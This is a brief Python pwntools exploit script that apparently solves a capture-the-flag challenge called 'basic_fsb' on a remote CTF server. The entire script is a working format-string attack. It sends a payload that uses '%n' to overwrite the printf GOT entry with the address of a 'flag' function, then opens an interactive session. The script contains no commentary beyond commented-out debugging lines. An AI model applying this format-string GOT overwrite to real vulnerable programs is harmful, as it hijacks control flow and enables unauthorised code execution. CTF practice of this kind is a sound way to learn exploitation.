#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./basic_fsb")
p = remote("ctf.j0n9hyun.xyz", 3002)
elf = ELF("./basic_fsb")
flag = elf.symbols['flag']
printf_got = elf.got['printf']

pay = p32(printf_got)
pay += '%' + str(int(flag)-4) + 'x'
pay += '%n'

p.sendlineafter("input : ", pay)
#gdb.attach(p)
p.interactive()
